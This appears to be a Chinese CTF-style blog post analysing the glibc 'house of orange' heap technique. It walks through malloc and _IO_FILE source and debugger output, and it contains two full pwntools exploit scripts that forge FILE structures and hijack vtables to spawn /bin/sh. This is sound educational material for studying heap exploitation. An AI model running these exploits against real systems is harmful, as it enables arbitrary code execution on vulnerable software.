---
title: house_of_orange源码分析
date: 2021-08-12 22:45:53
tags:
    - house_of_orange
    - 源码分析
---

## 获取free_chunk

程序中并没有free函数，但是可以利用以下方法获取free_chunk.

当`malloc(size);`时,`malloc() -> __libc_malloc -> _int_malloc`,以下简化了逻辑
```c
static void *
_int_malloc (mstate av, size_t bytes)
{
    if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
      ...
    if (in_smallbin_range (nb))
      ...
    else //in_largebin_range
      ... 
    
    通过malloc_consolidate合并且无法在已有的bins内找到
    goto use_top
    ...

  use_top:

    victim = av->top;
    size = chunksize (victim);
//---------------------check1--------------------------------
    if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
//---------------------check1--------------------------------
    {
      //从top_chunk中分割
      return ;
    }
    else
    {
      void *p = sysmalloc (nb, av);
      return p;
    }
}

```
如果所要申请的chunk无法在bins中获取且通过`malloc_consolidate`合并后也无法在bins中获取，那么会使用top_chunk。所申请的大小若小于top_chunk则会从中分割，否则会调用sysmalloc来解决。要绕过`check1`只需`size > top_size`
```c
static void *
sysmalloc (INTERNAL_SIZE_T nb, mstate av)
{
...
//---------------------check2--------------------------------
  if (av == NULL
      || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold)
	  && (mp_.n_mmaps < mp_.n_mmaps_max))) 
//---------------------check2--------------------------------
    {
    try_mmap:
    ...
      if ((unsigned long) (size) > (unsigned long) (nb))
        {
          mm = (char *) (MMAP (0, size, PROT_READ | PROT_WRITE, 0));
          ...
              return chunk2mem (p);
        }
    }

  old_top = av->top;
  old_size = chunksize (old_top);
  old_end = (char *) (chunk_at_offset (old_top, old_size));
//---------------------check3--------------------------------
  /*If not the first time through, we require old_size to be
     at least MINSIZE and to have prev_inuse set.*/

  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));

  /* Precondition: not enough current space to satisfy nb request */
  assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
//---------------------check3--------------------------------

// av 是否等于 &main_arena 与主线程子线程有关
  if (av != &main_arena)
    ...
  else
    {
    ...
      brk = (char *) (MORECORE (size));
      // MORECORE -> sbrk -> __brk 最终使用brk申请了空间
      if ()
        ...
      else
        {
          ...
          if (old_size >= MINSIZE)
            {
// --------------------------free----------------------------------          
              _int_free (av, old_top, 1);
// --------------------------free----------------------------------          
            }
        }
    } 
  return ;
}
```
走到了这部那么肯定会新申请空间,会有两种做法
1. mmap() 直接映射一段空间 而不破坏原有的top_chunk
2. 通过拓展top_chunk，在新的top_chunk中分割。其中是通过brk来拓展的,当然同时也会把old_top_chunk给free掉

肯定需要的是第二种，所以要绕过`check2`，其中只需`nb < mp_.mmap_threshold`,也即是size小于0x20000,之后需要满足`check3`的两个断言.
* assert1
  * `(old_size) >= MINSIZE` 其中`MINSIZE`是0x20
  * `prev_inuse (old_top)` 即top_chunk的p位为1
  * `old_end & (pagesize - 1)) == 0))`,其中`old_end =chunk_at_offset (old_top, old_size)`，也就是old_end后三位为0，其说明的也就是页对齐.
* assert2 按照`check1`

综上只需`malloc(size)`时
1. `size > top_size`
2. `size < 0x20000`
3. `prev_inuse (old_top)`
4. `(top_chunk + top_size)&0xfff == 0`页对齐
5. `size > 0x20`
## 触发



```c
static void *
_int_malloc (mstate av, size_t bytes)
{
    if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
      ...//在现有fastbin中取,若取出则直接返回
    if (in_smallbin_range (nb))
      ... //在现有smallbin中取,若取出则直接返回
    else //in_largebin_range
      ... 
    
    for(;; )//进入此循环说明无法在bin中直接获取,从需要从unsorted bin中寻找
    {
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)
      //判断是否unsorted bin 中还有剩余
      {
        bck = victim->bk;
//------------------------trigger--------------------------
        if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
//------------------------trigger--------------------------

        if ( )
          {
            /* split and reattach remainder */
            ...
            return p;
          }
//------------------------unsorted bin attack--------------------------
          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
//------------------------unsorted bin attack--------------------------
      
        if (size == nb)
        {
         ... //从unsorted bin中脱出的victim如正好满malloc(nb)
         return ;
        }
        /* 把victim放入bin */
        if (in_smallbin_range (size))
        {
          victim_index = smallbin_index (size);
          bck = bin_at (av, victim_index);
          fwd = bck->fd;
        }
        else
          ... //large bin

        mark_bin (av, victim_index);
        victim->bk = bck;
        victim->fd = fwd;
        fwd->bk = victim;
        bck->fd = victim;
        //把victim 链入smallbin

        ....
      }
    ...
}
    
//  通过malloc_consolidate合并且无法在已有的bins内找到
    goto use_top
    ...
```
`unsorted bin attack`描述的是遍历unsorted bin时，把需要检测的victim脱出unsorted bin的过程。脱出时没有检测链表的完整性。只需伪造victim的bk指针bck，在exploit中`bck->fd`会被写入`main_arena+88`。

完成unsorted bin attack之后按照源码，如申请的chunk并不恰好和victim大小相等,会把其链入small bin，之后返回`while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)`,再次检测unsorted bin是否为空。

由于`unsorted bin attack`,`victim = unsorted_chunks (av)->bk`指向的是`_IO_list_all+0x10`处,程序会以为 unsorted bin并没有清空, 接着进入触发段，`__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)`,`victim->size`指的是`_IO_list_all+0x8处`，此处没有进行过操作，为0，也即size为0,不满足条件,进入`malloc_printerr`。
```shell
pwndbg> x/8gx victim
0x7ffff7dd2510:	                  0x0000000000000000	0x0000000000000000
0x7ffff7dd2520 <_IO_list_all>:	  0x00007ffff7dd1b78	0x0000000000000000
0x7ffff7dd2530:	                  0x0000000000000000	0x0000000000000000
0x7ffff7dd2540 <_IO_2_1_stderr_>: 0x00000000fbad2887	0x00007ffff7dd25c3
pwndbg> p *victim
$8 = {
  prev_size = 0, 
  size = 0, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```
进入malloc_printerr之后会回收资源，为程序退出做准备，其中就包括对_IO_FILE的刷新`flush(NULL)`,最后由于`_IO_overflow(fp,0)`获取shell.

流程 `malloc_printerr -> __libc_message -> abort -> flush -> _IO_flush_all_lockp -> _IO_OVERFLOW(fp)`。

由于这是正常报错流程，无需过多的绕过,只需满足`_IO_flush_all_lockp`里的check，由于c语言判断条件时短路现象,就是`if(expr1&&expr2&&expr3&&expr4)`,只有exp1为真时才会检测expr2。同理只有满足`(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)`才会检测`_IO_overflow`
```c

malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)
{
  ...
  __libc_message (action & 2, "*** Error in `%s': %s: 0x%s ***\n",
                  __libc_argv[0] ? : "<unknown>", str, cp);
  ...
}
--------------------------------------------------------------
__libc_message (int do_abort, const char *fmt, ...)
{
  ...
  if (do_abort)
    {
      ...
      /* Kill the application.  */
      abort ();
    }
}
----------------------------------------------------------------
abort (void)
{
  ...
  /* Flush all streams.  We cannot close them now because the user
     might have registered a handler for SIGABRT.  */
  if (stage == 1)
    {
      ++stage;
      fflush (NULL);
    }
-------------------------------------------------------------------
#define fflush(s) _IO_flush_all_lockp (0)
--------------------------------------------------------------------
_IO_flush_all_lockp (int do_lock)
{
  ...
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
    //------------------------check--------------------------------
          if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
    //--------------------------exploit-----------------------------
        && _IO_OVERFLOW (fp, EOF) == EOF)
    //--------------------------exploit-----------------------------
      if ()
        ...
      else
	      fp = fp->_chain;
    }
  return ;
}
----------------------------------------------------   
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
// 约等于执行了(((struct _IO_FILE_plus*)fp)->vtable->__overflow)(FP,CH);
```
执行`_IO_OVERFLOW`的具体流程是`(((struct _IO_FILE_plus*)fp)->vtable->__overflow)(FP,CH);`
```shell
   0x7ffff7a89194 <_IO_flush_all_lockp+356>    mov    rax, qword ptr [rbx + 0xd8] 
   # vtable - IO_FILE = 0xd8
 ► 0x7ffff7a891a3 <_IO_flush_all_lockp+371>    call   qword ptr [rax + 0x18] <winner>
   # _overflow - vtable = 0x18

```
综上满足的条件
* top的bk为 `libc.sym["_IO_list_all"]-0x10`
* 对 topchunk 进行`unsorted bin attack`
* `fp->_mode <= 0`
* `fp->_IO_write_ptr > fp->_IO_write_base`
## exp



```python
#!/usr/bin/env python
from pwn import *

# context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)

p = process("./houseoforange")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(size,name):
	sal("Your choice : ","1")
	sal("Length of name :",str(size))
	sal("Name :",name)
	sal("Price of Orange:",str(0x10))
	sal("Color of Orange:",str(1))
def show():
	sal("Your choice : ","2")
def edit(size,name):
	sal("Your choice : ","3")
	sal("Length of name :",str(size))
	sal("Name:",name)
	sal("Price of Orange:",str(0x10))
	sal("Color of Orange:",str(1))
def file1():
	file= "/bin/sh\x00"                        #_flags
	file+=p64(0x61)                       #_IO_read_ptr
	file+=p64(0)                       #_IO_read_end
	file+=p64(libc.sym["_IO_list_all"]-0x10)                       #_IO_read_base
	file+=p64(0)                       #_IO_write_base
	file+=p64(1)                       #_IO_write_ptr
	file+=p64(0)                       #_IO_write_end
	file+=p64(0)                       #_IO_buf_base
	file+=p64(0)                       #_IO_buf_end
	file+=p64(0)                       #_IO_save_base
	file+=p64(0)                       #_IO_backup_base
	file+=p64(0)                       #_IO_save_end
	file+=p64(0)                       #_markers
	file+=p64(0)                       #chain   could be a anathor file struct
	file+=p32(0)                       #_fileno
	file+=p32(0)                       #_flags2
	file+=p64(0)                       #_old_offset
	file+=p16(0)                       #_cur_column
	file+=p8(0)                        #_vtable_offset
	file+=p8(0)                        #_shortbuf[0]
	file+=p32(0)                       #_shortbuf[1]
	file+=p64(0)                       #_lock
	file+=p64(0)                       #_offset
	file+=p64(0)                       #_codecvt
	file+=p64(0)                       #_wide_data
	file+=p64(0)                       #_freeres_list
	file+=p64(0)                       #_freeres_buf
	file+=p64(0)                       #__pad5
	file+=p32(0)                       #_mode
	file+=p32(0)                       #unused2
	file+=p64(0)*2                     #unused2
	file+=p64(heap+0x5d8-0x18)         #vtable
	file+=p64(0)
	file+=p64(libc.sym["system"])
	file+=p64(0)
	return file   
add(0x18,"cat03")
show()
payload = "A"*0x18
payload += p64(0x21)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0xfa1)
payload += p64(0)
edit(0x18+0x8*6,payload[:-1])
add(0x1000,"giles")
add(0x400,"Anderso")
show()
libc.address = u64(ru("\x7f")[-6:]+"\x00\x00")-1640-0x10 - libc.sym["__malloc_hook"]
info("libc base 0x%x"%libc.address)
payload = ""
payload += "A"*0x10
payload += "A"*7
edit(0x18,payload)
show()
ru("AAAAAAAAAAAAAAAAAAAAAAA\n")
heap = u64(r(6)+"\x00\x00")-0xc0
info("heap base 0x%x"%heap)

payload = "\x00"*0x408
payload += p64(0x21)
payload += p64(0)
payload += p64(0)
payload += file1()
edit(len(payload),payload[:-1])
r()
sl("1")
sh()
```
## Libc 2.24-2.26


由于在宏上对jump进行了加强,使得通过`vtable`调用`__OVERFLOW_`时检测了vtable的范围
```c
# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))
```
```c
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```
但是规定的范围内还有其他的虚表，可以把伪造的vtable指向这个范围的其他位置，从而调用其他虚表内的函数。
```c
#define _IO_USER_BUF 1
_IO_str_finish (_IO_FILE *fp, int dummy)
{
//-----------------------exploit-----------------------------------
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
//-----------------------exploit-----------------------------------
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```
比如我们可以把原`__OBVRFLOW的位置`，指向`_IO_str_finish`,从而绕过范围检查，此时在执行`__IO_OVERFLOW`时,实际执行了`_IO_str_finish`,进入`_IO_str_finish`后会调用`(((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base)`,所以在伪造fp时注意`_s._free_buffer`,`fp->_IO_buf_base`的伪造就可以控制程序流.

当然并非一定要把OVERFLOW覆盖成_IO_str_finish，其他函数也有类似`(*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);``(char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);`只不过需要绕过很多检查。而`_IO_str_finish`只需绕过`!(fp->_flags & _IO_USER_BUF)`即可。
```shell
pwndbg> disassemble _IO_str_finish
Dump of assembler code for function _IO_str_finish:
   0x00007ffff7a8f6b0 <+0>:	push   rbx
   0x00007ffff7a8f6b1 <+1>:	mov    rbx,rdi
   0x00007ffff7a8f6b4 <+4>:	mov    rdi,QWORD PTR [rdi+0x38]
   0x00007ffff7a8f6b8 <+8>:	test   rdi,rdi
   0x00007ffff7a8f6bb <+11>:	je     0x7ffff7a8f6c8 <_IO_str_finish+24>
   0x00007ffff7a8f6bd <+13>:	test   BYTE PTR [rbx],0x1
   0x00007ffff7a8f6c0 <+16>:	jne    0x7ffff7a8f6c8 <_IO_str_finish+24>
   0x00007ffff7a8f6c2 <+18>:	call   QWORD PTR [rbx+0xe8]
   0x00007ffff7a8f6c8 <+24>:	mov    QWORD PTR [rbx+0x38],0x0
   0x00007ffff7a8f6d0 <+32>:	mov    rdi,rbx
   0x00007ffff7a8f6d3 <+35>:	xor    esi,esi
   0x00007ffff7a8f6d5 <+37>:	pop    rbx
   0x00007ffff7a8f6d6 <+38>:	jmp    0x7ffff7a8e130 <__GI__IO_default_finish>
End of assembler dump.
pwndbg> p *(struct _IO_strfile_*)0x55c55d3994f0
$3 = {
  _sbf = {
    _f = {
      _flags = 0, 
      _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, 
      _IO_read_base = 0x7f9142052510 "", 
      _IO_write_base = 0x0, 
      _IO_write_ptr = 0x1 <error: Cannot access memory at address 0x1>, 
      _IO_write_end = 0x0, 
      _IO_buf_base = 0x7f9141e19e57 "/bin/sh", 
      ...
      _mode = 0, 
      ...
    }, 
    vtable = 0x7f9142050798
  }, 
  _s = {
    _allocate_buffer = 0x0, 
    _free_buffer = 0x7f9141cd23a0 <__libc_system>
  }
}

```
在汇编层面查看,只需在`file+0xe8`处，也即是下面结构体中的`_free_buffer`处，放好`system`,在`_IO_buf_base`处放置`/bin/sh\x00`就能获取shell.
综上需要满足。
* top的bk为 `libc.sym["_IO_list_all"]-0x10` 即 `_IO_read_base = `为`libc.sym["_IO_list_all"]-0x10`
* `fp->_mode <= 0` 直接不用改,等于零
* `fp->_IO_write_ptr > fp->_IO_write_base` 
* vtable = `_IO_str_jumps + 0x8`
* `(fp->_flags & 1) = 0`即`fp->_flags`是偶数
* `fake_file + 0xe8 = system_addr`
* `fp->_IO_buf_base = binsh_addr`
## EXP
```c
#!/usr/bin/env python
from pwn import *

# context.log_level = "debug"
s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)

p = process("./houseoforange")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(size,name):
	sal("Your choice : ","1")
	sal("Length of name :",str(size))
	sal("Name :",name)
	sal("Price of Orange:",str(0x10))
	sal("Color of Orange:",str(1))
def show():
	sal("Your choice : ","2")
def edit(size,name):
	sal("Your choice : ","3")
	sal("Length of name :",str(size))
	sal("Name:",name)
	sal("Price of Orange:",str(0x10))
	sal("Color of Orange:",str(1))
def file():
	file= p64(0)                       #_flags
	file+=p64(0x61)                       #_IO_read_ptr
	file+=p64(0)                       #_IO_read_end
	file+=p64(libc.sym["_IO_list_all"]-0x10)                       #_IO_read_base
	file+=p64(0)                       #_IO_write_base
	file+=p64(1)                       #_IO_write_ptr
	file+=p64(0)                       #_IO_write_end
	file+=p64(libc.search("/bin/sh\x00").next())        #_IO_buf_base
	file+=p64(0)                       #_IO_buf_end
	file+=p64(0)                       #_IO_save_base
	file+=p64(0)                       #_IO_backup_base
	file+=p64(0)                       #_IO_save_end
	file+=p64(0)                       #_markers
	file+=p64(0)                       #chain   could be a anathor file struct
	file+=p32(0)                       #_fileno
	file+=p32(0)                       #_flags2
	file+=p64(0)                       #_old_offset
	file+=p16(0)                       #_cur_column
	file+=p8(0)                        #_vtable_offset
	file+=p8(0)                        #_shortbuf[0]
	file+=p32(0)                       #_shortbuf[1]
	file+=p64(0)                       #_lock
	file+=p64(0)                       #_offset
	file+=p64(0)                       #_codecvt
	file+=p64(0)                       #_wide_data
	file+=p64(0)                       #_freeres_list
	file+=p64(0)                       #_freeres_buf
	file+=p64(0)                       #__pad5
	file+=p32(0)                       #_mode
	file+=p32(0)                       #unused2
	file+=p64(0)*2                     #unused2
	file+=p64(libc.address+0x3c3798)   #vtable
	file+=p64(0)   
	file+=p64(libc.sym["system"])   
	file+=p64(0) #pad

	return file   
add(0x18,"cat03")
show()
payload = "A"*0x18
payload += p64(0x21)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0xfa1)
payload += p64(0)
edit(0x18+0x8*6,payload[:-1])
add(0x1000,"giles")
add(0x400,"Anderso")
show()
libc.address = u64(ru("\x7f")[-6:]+"\x00\x00")-1640-0x10 - libc.sym["__malloc_hook"]
info("libc base 0x%x"%libc.address)
payload = ""
payload += "A"*0x10
payload += "A"*7
edit(0x18,payload)
show()
ru("AAAAAAAAAAAAAAAAAAAAAAA\n")
heap = u64(r(6)+"\x00\x00")-0xc0
info("heap base 0x%x"%heap)

payload = "\x00"*0x408
payload += p64(0x21)
payload += p64(0)
payload += p64(0)
payload += file()
edit(len(payload),payload[:-1])
r()
sl("1")
sh()
```

### 2.27-3ubuntu1.4 已不可使用

```bash
# 2.27-3ubuntu1.2
pwndbg> disassemble _IO_str_finish 
Dump of assembler code for function _IO_str_finish:
   0x0000000000090370 <+0>:	push   rbx
   0x0000000000090371 <+1>:	mov    rbx,rdi
   0x0000000000090374 <+4>:	mov    rdi,QWORD PTR [rdi+0x38]
   0x0000000000090378 <+8>:	test   rdi,rdi
   0x000000000009037b <+11>:	je     0x90388 <_IO_str_finish+24>
   0x000000000009037d <+13>:	test   BYTE PTR [rbx],0x1
   0x0000000000090380 <+16>:	jne    0x90388 <_IO_str_finish+24>
   0x0000000000090382 <+18>:	call   QWORD PTR [rbx+0xe8]
   0x0000000000090388 <+24>:	mov    QWORD PTR [rbx+0x38],0x0
   0x0000000000090390 <+32>:	mov    rdi,rbx
   0x0000000000090393 <+35>:	xor    esi,esi
   0x0000000000090395 <+37>:	pop    rbx
   0x0000000000090396 <+38>:	jmp    0x8ecd0 <__GI__IO_default_finish>
# 2.27-3ubuntu1.4
pwndbg> disassemble _IO_str_finish 
Dump of assembler code for function _IO_str_finish:
   0x00000000000903c0 <+0>:	push   rbx
   0x00000000000903c1 <+1>:	mov    rbx,rdi
   0x00000000000903c4 <+4>:	mov    rdi,QWORD PTR [rdi+0x38]
   0x00000000000903c8 <+8>:	test   rdi,rdi
   0x00000000000903cb <+11>:	je     0x903d2 <_IO_str_finish+18>
   0x00000000000903cd <+13>:	test   BYTE PTR [rbx],0x1
   0x00000000000903d0 <+16>:	je     0x903e8 <_IO_str_finish+40>
   0x00000000000903d2 <+18>:	mov    QWORD PTR [rbx+0x38],0x0
   0x00000000000903da <+26>:	mov    rdi,rbx
   0x00000000000903dd <+29>:	xor    esi,esi
   0x00000000000903df <+31>:	pop    rbx
   0x00000000000903e0 <+32>:	jmp    0x8ed30 <__GI__IO_default_finish>
   0x00000000000903e5 <+37>:	nop    DWORD PTR [rax]
   0x00000000000903e8 <+40>:	call   0x212c8 <free@plt>
   0x00000000000903ed <+45>:	jmp    0x903d2 <_IO_str_finish+18>
```

## 参考

* [libc-2.23的源码](https://launchpad.net/ubuntu/+source/glibc)
* [IO FILE 之vtable劫持以及绕过](https://ray-cp.github.io/archivers/IO_FILE_vtable_check_and_bypass)
* [星盟安全PWN系列教程](https://www.bilibili.com/video/BV1qU4y1L78T)
* [100个gdb小技巧](https://wizardforcel.gitbooks.io/100-gdb-tips/content/)